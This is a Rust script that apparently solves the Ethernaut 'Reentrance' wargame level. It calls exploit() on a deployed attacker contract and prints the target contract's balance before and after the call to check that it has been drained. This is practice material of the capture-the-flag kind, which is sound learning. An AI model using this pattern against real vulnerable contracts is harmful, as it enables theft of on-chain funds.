#[allow(unused_imports)]
use alloy::{
    network::{EthereumWallet, TransactionBuilder},
    primitives::{
        Bytes, U256, address,
        utils::{Unit, format_ether},
    },
    providers::{Provider, ProviderBuilder},
    rpc::types::TransactionRequest,
    signers::local::PrivateKeySigner,
    sol,
};

sol!{
    #[sol(rpc)]
    contract Reentrance {
        function balanceOf(address _who) public view returns (uint256 balance);
    }

    #[sol(rpc)]
    contract Exp_10 {
        function exploit() payable external;
    }
}

use crate::ethernaut;
use crate::utils;
use tokio::runtime::Runtime;

#[allow(dead_code)]
pub fn level10_runner() -> Result<(), Box<dyn std::error::Error>> {
    let rt = Runtime::new()?;
    rt.block_on(level10())?;

    Ok(())
}

async fn level10() -> Result<(), Box<dyn std::error::Error>> {
    let alice_signer: PrivateKeySigner = ethernaut::ALICE_KEY.parse()?;
    let bob_signer:   PrivateKeySigner = ethernaut::BOB_KEY.parse()?;

    let mut wallet = EthereumWallet::from(alice_signer);
    wallet.register_signer(bob_signer);

    let provider = ProviderBuilder::new()
        .wallet(wallet)
        .connect(ethernaut::RPC)
        .await?;

    let reentrance_address = "0x6bDE78d0E31f343f3d6a17b0745ad2311a3dbC86".parse()?;
    #[allow(unused_variables)]
    let reentrace = Reentrance::new(
        reentrance_address,
        provider.clone()
    );
    let exp_address = "0xBCcdeA1fbb40846a0EA4953daa5e0E0447998d0F".parse()?;
    let exp = Exp_10::new(exp_address, provider.clone());

    println!("[CHECK]");
    // 1000000000000000
    let balance = utils::balance(reentrance_address).await?;
    println!("[Reentrance.balance]    balance = {balance}\n");
    
    let exploit_tx = exp
        .exploit()
        .value(U256::from(100000000000000u128))
        .send()
        .await?;
    println!(
        "[Exp.exploit()]    Panding transaction... {}",
        exploit_tx.tx_hash()
    );

    let exploit_receipt = exploit_tx.get_receipt().await?;
    println!(
        "[Exp.exploit()]    transaction included in block {}\n",
        exploit_receipt
            .block_number
            .expect("Failed to get block number")
    );
    
    println!("[CHECK]");
    let balance = utils::balance(reentrance_address).await?;
    println!("[Reentrance.balance]    balance = {balance}\n");
    
    
    Ok(())
}

// 0x6bDE78d0E31f343f3d6a17b0745ad2311a3dbC86
